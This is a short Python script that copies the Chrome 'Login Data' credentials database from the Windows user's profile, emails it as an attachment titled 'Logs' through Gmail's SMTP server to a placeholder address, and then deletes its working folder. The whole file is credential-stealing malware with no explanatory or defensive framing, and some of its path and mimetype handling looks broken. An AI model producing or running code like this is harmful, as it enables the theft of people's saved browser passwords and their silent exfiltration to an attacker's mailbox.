import os,shutil,smtplib
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from mimetypes import guess_type
from email.encoders import encode_base64
from email.mime.text import MIMEText
name = os.getenv('username')
path = "C:/Users/"+name+"/AppData/Local/Google/Chrome/User Data/Default/Login Data"
path2 = "C:/Users/"+name+"/AppData/Local/Google/Chrome/User Data/Default/d/"
path3 = "C:/Users/"+name+"/AppData/Local/Google/Chrome/User Data/Default/Login Data/d/chrome.txt"
os.mkdir(path2)
shutil.copy(path,path2)
os.chdir(path2)
os.rename("Login Data","chrome.txt")
msg = MIMEMultipart()
sender = 'sample@sample.com'
reciever = 'sample2@sample.com'
msg['From'] = sender
msg['To'] = reciever
msg['Subject'] = 'Logs'
mimetype, encoding = guess_type(path3)
mimetype = mimetype.split('/', 1)
fp = open(path, 'rb')
attachment = MIMEBase(mimetype[0], mimetype[1])
attachment.set_payload(fp.read())
fp.close()
encode_base64(attachment)
attachment.add_header('Content-Disposition', 'attachment',filename=path)
msg.attach(attachment)
sm = smtplib.SMTP("smtp.gmail.com",587)
sm.starttls()
sm.login('sample@sample.com','samplepassword')
sm.sendmail(sender,reciever,msg.as_string())
sm.quit()
shutil.rmtree(path2)